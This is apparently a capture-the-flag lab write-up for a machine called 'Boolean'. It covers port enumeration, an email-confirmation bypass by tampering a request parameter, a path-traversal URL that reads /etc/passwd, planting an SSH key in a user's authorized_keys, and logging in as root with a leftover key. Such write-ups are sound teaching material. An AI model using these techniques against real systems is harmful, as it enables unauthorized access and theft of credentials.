#Pwned #PathTraversal #SSH
```IP
192.168.180.231
```
# Enumeration
## Nmap

As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.180.231 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)            
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBCcfKYKMXuTWeyLKlFNHgmebcXbFAjSpbr39R8GFHYRmc/mZXKNgEoa5gkFAVr8kVVul4X6//DcnRuHtrCpHcnTIZLT9g1DPB09VsLzsjT0TpmqkcDYtZazo1mjnBZdaM+AxoDMghZd8AXiNrCl7jCN+vRjUQc8T1wD4PoC02XjeCAI8Yha++Mv9ZrSPZ+/gBv
gZPL3pdQhVGUSUHOmXod4xcdm5ReNiZRNZklOhhscbGfSCqQIdJogegZfMrlueeG3EY7Kkf5CxAUDH/9ir2dEDDifIpqKV8W7ncKEpsZiqgDh36OdMX4LPJ0NmZiT/g8CvINx7k4HWj3ksT+5C7
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)           
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEK0B9iLJQztyEpGiNffHgQuGcxZRO/BOi+r0j/P8Hkz02pIWW2hFrArbzehUNQ46ZmFwMhxxmrIOLBpUt9ZGBw=
|   256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)         
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOAlO2qlRhyMwzzf3xAK4wOGz1UD5t9+QQO5J3QjTkaZ
80/tcp    open   http    syn-ack ttl 61                
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-title: Boolean                       
|_Requested resource was http://192.168.180.231/login
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings:                 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, Termin
alServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
3000/tcp  closed ppp     reset ttl 61
33017/tcp open   http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
```
## HTTP 80
When navigating to the target IP it redirects us to a login page. It seems like in order to register a new user we need email confirmation.

## HTTP 33017
In development. It does not seem to contain anything interesting. We can however get the apache version with whatweb:
```
whatweb http://192.168.180.231:33017
```
Apache 2.4.38
# Exploitation
By intercepting the email confirmation request with BurpUsite and sending it to the repeater, we can alter the parameter confirmed=True.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120115231.png?raw=true)

Now it is possible to click on "Boolean" on the register page and we are logged in.
## LFI
We are presented with a File Manager webpage. We can actually exploit a path traversal vulnerability in order to download the /etc/passwd file:
```
http://192.168.180.231/?cwd=../../../../../etc/&file=passwd&download=true
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120122332.png?raw=true)

We now know that there is a user named remi. We can path traversal to remi ssh directory as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120133539.png?raw=true)

And upload here a public key named authorized_keys created with the following command:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120133620.png?raw=true)

And now we can access to the machine as remi using the created id_rsa file:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120133518.png?raw=true)

# PrivEsc

## Manual

Upon a more close examination, we notice we have root keys in .ssh/keys/root directory.
```
ssh root@127.0.0.1 -i .ssh/keys/root
```

So just by ssh as root user with this keys we log in as root.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241120173339.png?raw=true)

Pwned!